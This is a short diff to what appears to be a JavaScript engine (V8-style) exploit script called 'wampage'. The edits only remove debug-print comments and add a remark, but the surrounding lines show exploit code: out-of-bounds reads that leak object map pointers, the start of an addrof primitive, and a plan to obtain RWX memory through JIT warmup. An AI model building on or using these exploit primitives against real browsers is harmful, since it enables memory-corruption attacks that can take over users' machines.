@@ -31,9 +31,6 @@ function wampage() {
 	// use oob reads to get pointers to <Map(FAST_DOUBLE_ELEMENTS)> and <Map(FAST_ELEMENTS)>
 	var fast_double_elements_map = overflow1[0x137];
 	var fast_elements_map = overflow2[0x139];
-	//%DebugPrint(fast_double_elements_map);
-	//%DebugPrint(fast_elements_map);
-
 
 	function addrof(obj) {
 		// we write the data as an Element (i.e. a pointer)
@@ -115,7 +112,7 @@ function wampage() {
 	// set up some RWX memory
 
 	function myfunc(a) {
-		return (a + 0xdeadbeef) | 0;
+		return (a + 0xdeadbeef) | 0; // entirely arbitrary, probably doesn't even matter
 	}
 
 	for (var i=0; i<100000; i++) myfunc(i); // jit warmup
